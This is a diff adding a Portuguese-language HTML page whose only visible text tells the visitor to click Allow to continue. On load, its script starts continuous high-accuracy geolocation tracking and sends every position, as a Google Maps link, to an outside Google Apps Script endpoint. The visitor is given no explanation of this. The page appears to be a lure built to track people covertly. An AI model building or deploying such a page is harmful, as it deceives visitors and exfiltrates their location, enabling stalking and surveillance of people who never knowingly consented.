@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title> </title>
+  <style>
+    /* Estilo para centralizar o conteúdo da página */
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh; /* Altura total da visualização */
+      margin: 0;
+      font-family: Arial, sans-serif;
+      text-align: center;
+    }
+    h1 {
+      font-size: 24px;
+    }
+  </style>
+  <script>
+    let watchID;
+
+    function startSendingLocation() {
+      if (navigator.geolocation) {
+        // Configura o observador da localização
+        watchID = navigator.geolocation.watchPosition(
+          sendLocation,
+          showError,
+          {
+            enableHighAccuracy: true,
+            maximumAge: 30000, // A posição pode ser armazenada por até 30 segundos
+            timeout: 27000 // Tempo máximo de espera para obter a localização
+          }
+        );
+      } else {
+        alert("Geolocalização não é suportada neste navegador.");
+      }
+    }
+
+    function sendLocation(position) {
+      const lat = position.coords.latitude;
+      const lng = position.coords.longitude;
+      const accuracy = position.coords.accuracy;
+      const url = "https://script.google.com/macros/s/AKfycbwYOerrVwS24d7WHZ1bwZ6cq4kn1L04IuyrPFU0vv4-bJKJWkmInu4TINKH9QG83s0k/exec";
+
+      // Define a mensagem com base na precisão
+      const gpsMessage = accuracy < 100 ? "" : "localização imprecisa";
+
+      fetch(`${url}?informacao=https://www.google.com/maps?q=${lat},${lng} ${gpsMessage}`)
+        .then(response => response.text())
+        .then(data => {
+          if (gpsMessage) {
+            console.log("Localização enviada: " + gpsMessage);
+          } else {
+            console.log("Localização enviada com precisão.");
+          }
+        })
+        .catch(error => console.error("Erro ao enviar localização:", error));
+    }
+
+    function showError(error) {
+      switch(error.code) {
+        case error.PERMISSION_DENIED:
+          console.error("Permissão negada.");
+          break;
+        case error.POSITION_UNAVAILABLE:
+          console.error("Posição indisponível.");
+          break;
+        case error.TIMEOUT:
+          console.error("Tempo esgotado.");
+          break;
+        case error.UNKNOWN_ERROR:
+          console.error("Erro desconhecido.");
+          break;
+      }
+    }
+  </script>
+</head>
+<body onload="startSendingLocation()">
+  <h1>Clique em Permitir para continuar...</h1>
+</body>
+</html>
